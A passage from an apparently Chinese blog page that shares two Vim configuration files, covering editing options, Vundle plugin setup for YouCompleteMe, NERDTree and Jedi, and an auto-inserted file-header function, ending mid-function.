:w&lt;cr&gt;:make&lt;cr&gt;</span><br><span class="line">"代码补全 </span><br><span class="line">set completeopt=preview,menu </span><br><span class="line">" set completeopt=longest,menu</span><br><span class="line">"允许插件  </span><br><span class="line">filetype plugin on</span><br><span class="line">"共享剪贴板  </span><br><span class="line">set clipboard+=unnamed </span><br><span class="line">"从不备份  </span><br><span class="line">set nobackup</span><br><span class="line">"make 运行</span><br><span class="line">:set makeprg=g++\ -Wall\ \ %</span><br><span class="line">"自动保存</span><br><span class="line">set autowrite</span><br><span class="line">set ruler                   " 打开状态栏标尺</span><br><span class="line">set cursorline              " 突出显示当前行</span><br><span class="line">set magic                   " 设置魔术</span><br><span class="line">set guioptions-=T           " 隐藏工具栏</span><br><span class="line">set guioptions-=m           " 隐藏菜单栏</span><br><span class="line">"set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\ %c:%l/%L%)\</span><br><span class="line">" 设置在状态行显示的信息</span><br><span class="line">set foldcolumn=0</span><br><span class="line">set foldmethod=indent </span><br><span class="line">set foldlevel=3 </span><br><span class="line">set foldenable              " 开始折叠</span><br><span class="line">" 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line">set nocompatible</span><br><span class="line">" 语法高亮</span><br><span class="line">set syntax=on</span><br><span class="line">" 去掉输入错误的提示声音</span><br><span class="line">set noeb</span><br><span class="line">" 在处理未保存或只读文件的时候，弹出确认</span><br><span class="line">set confirm</span><br><span class="line">" 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line">" Tab键的宽度</span><br><span class="line">set tabstop=4</span><br><span class="line">" 统一缩进为4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">" 不要用空格代替制表符</span><br><span class="line">set noexpandtab</span><br><span class="line">" 在行和段开始处使用制表符</span><br><span class="line">set smarttab</span><br><span class="line">" 显示行号</span><br><span class="line">set number</span><br><span class="line">" 历史记录数</span><br><span class="line">set history=1000</span><br><span class="line">"禁止生成临时文件</span><br><span class="line">set nobackup</span><br><span class="line">set noswapfile</span><br><span class="line">"搜索忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line">"搜索逐字符高亮</span><br><span class="line">set hlsearch</span><br><span class="line">set incsearch</span><br><span class="line">"行内替换</span><br><span class="line">set gdefault</span><br><span class="line">"编码设置</span><br><span class="line">set enc=utf-8</span><br><span class="line">set fencs=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936</span><br><span class="line">"语言设置</span><br><span class="line">set langmenu=zh_CN.UTF-8</span><br><span class="line">set helplang=cn</span><br><span class="line">" 我的状态行显示的内容（包括文件类型和解码）</span><br><span class="line">"set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;</span><br><span class="line">"set statusline=[%F]%y%r%m%*%=[Line:%l/%L,Column:%c][%p%%]</span><br><span class="line">" 总是显示状态行</span><br><span class="line">set laststatus=2</span><br><span class="line">" 命令行（在状态行下）的高度，默认为1，这里是2</span><br><span class="line">set cmdheight=2</span><br><span class="line">" 侦测文件类型</span><br><span class="line">filetype on</span><br><span class="line">" 载入文件类型插件</span><br><span class="line">filetype plugin on</span><br><span class="line">" 为特定文件类型载入相关缩进文件</span><br><span class="line">filetype indent on</span><br><span class="line">" 保存全局变量</span><br><span class="line">set viminfo+=!</span><br><span class="line">" 带有如下符号的单词不要被换行分割</span><br><span class="line">set iskeyword+=_,$,@,%,#,-</span><br><span class="line">" 字符间插入的像素行数目</span><br><span class="line">set linespace=0</span><br><span class="line">" 增强模式中的命令行自动完成操作</span><br><span class="line">set wildmenu</span><br><span class="line">" 使回格键（backspace）正常处理indent, eol, start等</span><br><span class="line">set backspace=2</span><br><span class="line">" 允许backspace和光标键跨越行边界</span><br><span class="line">set whichwrap+=&lt;,&gt;,h,l</span><br><span class="line">" 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）</span><br><span class="line">set mouse=a</span><br><span class="line">set selection=exclusive</span><br><span class="line">set selectmode=mouse,key</span><br><span class="line">" 通过使用: commands命令，告诉我们文件的哪一行被改变过</span><br><span class="line">set report=0</span><br><span class="line">" 在被分割的窗口间显示空白，便于阅读</span><br><span class="line">set fillchars=vert:\ ,stl:\ ,stlnc:\</span><br><span class="line">" 高亮显示匹配的括号</span><br><span class="line">set showmatch</span><br><span class="line">" 匹配括号高亮的时间（单位是十分之一秒）</span><br><span class="line">set matchtime=1</span><br><span class="line">" 光标移动到buffer的顶部和底部时保持3行距离</span><br><span class="line">set scrolloff=3</span><br><span class="line">" 为C程序提供自动缩进</span><br><span class="line">set smartindent</span><br><span class="line">" 高亮显示普通txt文件（需要txt.vim脚本）</span><br><span class="line">au BufRead,BufNewFile *  setfiletype txt</span><br><span class="line">"自动补全</span><br><span class="line">:inoremap ( ()&lt;ESC&gt;i</span><br><span class="line">:inoremap ) &lt;c-r&gt;=ClosePair(')')&lt;CR&gt;</span><br><span class="line">":inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class="line">":inoremap &#125; &lt;c-r&gt;=ClosePair('&#125;')&lt;CR&gt;</span><br><span class="line">:inoremap [ []&lt;ESC&gt;i</span><br><span class="line">:inoremap ] &lt;c-r&gt;=ClosePair(']')&lt;CR&gt;</span><br><span class="line">:inoremap " ""&lt;ESC&gt;i</span><br><span class="line">:inoremap ' ''&lt;ESC&gt;i</span><br><span class="line">function! ClosePair(char)</span><br><span class="line">    if getline('.')[col('.') - 1] == a:char</span><br><span class="line">    return "\&lt;Right&gt;"</span><br><span class="line">    else</span><br><span class="line">    return a:char</span><br><span class="line">    endif</span><br><span class="line">endfunction</span><br><span class="line">filetype plugin indent on </span><br><span class="line">"打开文件类型检测, 加了这句才可以用智能补全</span><br><span class="line">set completeopt=longest,menu</span><br><span class="line"></span><br><span class="line">" ctages 插件</span><br><span class="line">set tags=/home/rpz/tags</span><br></pre></td></tr></table></figure>
+<h2 id="Vim编辑器开发环境设置"><a href="#Vim编辑器开发环境设置" class="headerlink" title="Vim编辑器开发环境设置"></a><strong>Vim编辑器开发环境设置</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># cat ~/.vimrc </span></span><br><span class="line"><span class="string">" Vundle Setting</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set nocompatible</span></span><br><span class="line"><span class="string">filetype off</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">Plugin 'VundleVim/Vundle.vim'</span></span><br><span class="line"><span class="string">"</span><span class="comment"># Plugin 'git://github.com/scrooloose/nerdtree.git'</span></span><br><span class="line"><span class="string">"# Plugin 'git://github.com/kien/ctrlp.vim.git'</span></span><br><span class="line"><span class="string">Plugin 'scrooloose/nerdtree'</span></span><br><span class="line"><span class="string">"</span> Let Vundle manage itself</span><br><span class="line"><span class="string">" Plugins</span></span><br><span class="line"><span class="string"> Plugin 'Valloric/YouCompleteMe'</span></span><br><span class="line"><span class="string"> Plugin 'scrooloose/syntastic'</span></span><br><span class="line"><span class="string"> Plugin 'bling/vim-airline'</span></span><br><span class="line"><span class="string"> Plugin 'SirVer/ultisnips'</span></span><br><span class="line"><span class="string"> Plugin 'edsono/vim-matchit'</span></span><br><span class="line"><span class="string"> Plugin 'elzr/vim-json'</span></span><br><span class="line"><span class="string"> Plugin 'honza/vim-snippets'</span></span><br><span class="line"><span class="string"> Plugin 'justinmk/vim-sneak'</span></span><br><span class="line"><span class="string"> Plugin 'kien/ctrlp.vim'</span></span><br><span class="line"><span class="string"> Plugin 'ludovicchabant/vim-lawrencium'</span></span><br><span class="line"><span class="string"> Plugin 'majutsushi/tagbar'</span></span><br><span class="line"><span class="string"> Plugin 'mhinz/vim-signify'</span></span><br><span class="line"><span class="string"> Plugin 'plasticboy/vim-markdown'</span></span><br><span class="line"><span class="string"> Plugin 'scrooloose/nerdcommenter'</span></span><br><span class="line"><span class="string"> Plugin 'sjl/gundo.vim'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-sleuth'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-surround'</span></span><br><span class="line"><span class="string"> Plugin 'tpope/vim-fugitive'</span></span><br><span class="line"><span class="string"> Plugin 'tyru/open-browser.vim'</span></span><br><span class="line"><span class="string"> Plugin 'vim-scripts/a.vim'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> Color schemes</span><br><span class="line"> Plugin <span class="string">'tomasr/molokai'</span></span><br><span class="line"> Plugin <span class="string">'flazz/vim-colorschemes'</span></span><br><span class="line"></span><br><span class="line"> call vundle<span class="comment">#end()</span></span><br><span class="line">filetype plugin indent on</span><br><span class="line"></span><br><span class="line"><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"><span class="string">" =&gt; YouCompleteMe  代码自动补全  Begin</span></span><br><span class="line"><span class="string">"</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" 自动补全配置</span></span><br><span class="line"><span class="string">set completeopt=longest,menu "让Vim的补全菜单行为与一般IDE一致(参考VimTip1228)</span></span><br><span class="line"><span class="string">autocmd InsertLeave * if pumvisible() == 0|pclose|endif "离开插入模式后自动关闭预览窗口</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;CR&gt;       pumvisible() ? "\&lt;C-y&gt;" : "\&lt;CR&gt;" "回车即选中当前项</span></span><br><span class="line"><span class="string">"上下左右键的行为 会显示其他信息</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;Down&gt;     pumvisible() ? "\&lt;C-n&gt;" : "\&lt;Down&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;Up&gt;       pumvisible() ? "\&lt;C-p&gt;" : "\&lt;Up&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? "\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageDown&gt;"</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;PageUp&gt;   pumvisible() ? "\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageUp&gt;"</span></span><br><span class="line"><span class="string">"youcompleteme  默认tab  s-tab 和自动补全冲突</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_select_completion=['&lt;c-n&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_select_completion = ['&lt;Down&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_previous_completion=['&lt;c-p&gt;']</span></span><br><span class="line"><span class="string">"let g:ycm_key_list_previous_completion = ['&lt;Up&gt;']</span></span><br><span class="line"><span class="string">let g:ycm_confirm_extra_conf=0 "关闭加载.ycm_extra_conf.py提示</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_tags_files=1 " 开启 YCM 基于标签引擎</span></span><br><span class="line"><span class="string">let g:ycm_min_num_of_chars_for_completion=1 " 从第2个键入字符就开始罗列匹配项</span></span><br><span class="line"><span class="string">let g:ycm_cache_omnifunc=0 " 禁止缓存匹配项,每次都重新生成匹配项</span></span><br><span class="line"><span class="string">let g:ycm_seed_identifiers_with_syntax=1 " 语法关键字补全</span></span><br><span class="line"><span class="string">nnoremap &lt;F5&gt; :YcmForceCompileAndDiagnostics&lt;CR&gt; "force recomile with syntastic</span></span><br><span class="line"><span class="string">"nnoremap &lt;leader&gt;lo :lopen&lt;CR&gt; "open locationlist</span></span><br><span class="line"><span class="string">"nnoremap &lt;leader&gt;lc :lclose&lt;CR&gt; "close locationlist</span></span><br><span class="line"><span class="string">inoremap &lt;leader&gt;&lt;leader&gt; &lt;C-x&gt;&lt;C-o&gt;</span></span><br><span class="line"><span class="string">"在注释输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1</span></span><br><span class="line"><span class="string">"在字符串输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_strings = 1</span></span><br><span class="line"><span class="string">"注释和字符串中的文字也会被收入补全</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 0</span></span><br><span class="line"><span class="string">nnoremap &lt;leader&gt;jd :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt; " 跳转到定义处</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"为了Python3的第三方库安装Jedi插件</span></span><br><span class="line"><span class="string">Plugin 'davidhalter/jedi-vim'</span></span><br><span class="line"><span class="string">"===============================Jedi==================================</span></span><br><span class="line"><span class="string">if has('python3')</span></span><br><span class="line"><span class="string">let g:loaded_youcompleteme = 1 " 判断如果是python3的话，就禁用ycmd。</span></span><br><span class="line"><span class="string">let g:jedi#force_py_version = 3</span></span><br><span class="line"><span class="string">let g:pymode_python = 'python3'</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">"===============================Jedi===================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">" =&gt; YouCompleteMe  代码自动补全  End</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" 设置配色方案</span></span><br><span class="line"><span class="string">" colorscheme torte</span></span><br><span class="line"><span class="string">" colorscheme murphy</span></span><br><span class="line"><span class="string">" colorscheme desert </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"字体 </span></span><br><span class="line"><span class="string">"if (has("gui_running")) </span></span><br><span class="line"><span class="string">"   set guifont=Bitstream\ Vera\ Sans\ Mono\ 10 </span></span><br><span class="line"><span class="string">"endif </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">" 显示相关  </span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">set shortmess=atI   " 启动的时候不显示那个援助乌干达儿童的提示  </span></span><br><span class="line"><span class="string">"winpos 5 5          " 设定窗口位置  </span></span><br><span class="line"><span class="string">"set lines=40 columns=155    " 设定窗口大小  </span></span><br><span class="line"><span class="string">set go=             " 不要图形按钮  </span></span><br><span class="line"><span class="string">"color asmanian2     " 设置背景主题  </span></span><br><span class="line"><span class="string">"set guifont=Courier_New:h10:cANSI   " 设置字体  </span></span><br><span class="line"><span class="string">syntax on           " 语法高亮  </span></span><br><span class="line"><span class="string">autocmd InsertLeave * se nocul  " 用浅色高亮当前行  </span></span><br><span class="line"><span class="string">autocmd InsertEnter * se cul    " 用浅色高亮当前行  </span></span><br><span class="line"><span class="string">set ruler           " 显示标尺  </span></span><br><span class="line"><span class="string">set showcmd         " 输入的命令显示出来，看的清楚些  </span></span><br><span class="line"><span class="string">set cmdheight=1     " 命令行（在状态行下）的高度，设置为1  </span></span><br><span class="line"><span class="string">set whichwrap+=&lt;,&gt;,h,l   " 允许backspace和光标键跨越行边界(不建议)  </span></span><br><span class="line"><span class="string">set scrolloff=3     " 光标移动到buffer的顶部和底部时保持3行距离  </span></span><br><span class="line"><span class="string">set novisualbell    " 不要闪烁(不明白)  </span></span><br><span class="line"><span class="string">set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;   "状态行显示的内容  </span></span><br><span class="line"><span class="string">set laststatus=1    " 启动显示状态行(1),总是显示状态行(2)  </span></span><br><span class="line"><span class="string">"set foldenable      " 允许折叠  </span></span><br><span class="line"><span class="string">set foldmethod=manual   " 手动折叠  </span></span><br><span class="line"><span class="string">"set background=dark "背景使用黑色 </span></span><br><span class="line"><span class="string">" 显示中文帮助</span></span><br><span class="line"><span class="string">if version &gt;= 603</span></span><br><span class="line"><span class="string">    set helplang=cn</span></span><br><span class="line"><span class="string">    set encoding=utf-8</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""</span></span><br><span class="line"><span class="string">"""</span><span class="string">""</span>新文件标题</span><br><span class="line"><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"><span class="string">"新建.c,.h,.sh,.java文件，自动插入文件头 </span></span><br><span class="line"><span class="string">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec "</span>:call SetTitle()<span class="string">" </span></span><br><span class="line"><span class="string">"</span><span class="string">"定义函数SetTitle，自动插入文件头 </span></span><br><span class="line"><span class="string">func SetTitle() </span></span><br><span class="line"><span class="string">    "</span>如果文件类型为.sh文件 </span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'sh'</span> </span><br><span class="line">    call setline(<span class="number">1</span>,<span class="string">"\#########################################################################"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>), <span class="string">"\# File Name: "</span>.expand(<span class="string">"%"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">1</span>, <span class="string">"\# Author: Function_Dou"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">2</span>, <span class="string">"\# mail: NOT"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">3</span>, <span class="string">"\# Created Time: "</span>.strftime(<span class="string">"%c"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">4</span>, <span class="string">"\#########################################################################"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">5</span>, <span class="string">"\#!/bin/bash"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">6</span>, <span class="string">""</span>) </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    call setline(<span class="number">1</span>, <span class="string">"/*************************************************************************"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>), <span class="string">"    &gt; File Name: "</span>.expand(<span class="string">"%"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">1</span>, <span class="string">"    &gt; Author: Function_Dou"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">2</span>, <span class="string">"    &gt; Mail: NOT"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">3</span>, <span class="string">"    &gt; Created Time: "</span>.strftime(<span class="string">"%c"</span>)) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">4</span>, <span class="string">" ************************************************************************/"</span>) </span><br><span class="line">    call append(line(<span class="string">"."</span>)+<span class="number">5</span>, <span class="string">""</span>)</span><br><span class="line">    endif</span><br><span class="line">    <span class="keyword">if</span> &amp;filetype == <span class="string">'cpp'</span></span><br><span class="line">    call append(line(<span 